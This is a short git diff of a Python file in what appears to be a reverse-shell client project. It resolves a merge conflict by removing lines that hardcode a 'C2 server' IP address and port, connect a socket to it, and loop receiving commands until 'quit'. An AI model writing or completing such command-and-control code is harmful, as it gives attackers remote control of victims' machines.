@@ -7,27 +7,11 @@ import subprocess
 #import sys
 #import code
 
-<<<<<<< HEAD
 #code.interact(local=locals())
 
 
 # Create socket
 def socket_create():
-=======
-HOST = '206.189.189.188' # ip of our C2 server
-PORT = 5555 # random port it does not matter
-
-# set up the socket and connect to the server
-s = socket.socket()
-s.connect((HOST, PORT))
-#s.sendall(cmd)
-# this loop will run until it receive 'quit'
-while True:
-    cmd = s.recv(1024).decode()
-    if cmd.lower() == 'quit':
-        break
-		
->>>>>>> 1d31426edf9379435c1fb7d7ce3ee58d04c38f84
     try:
         global host
         global port
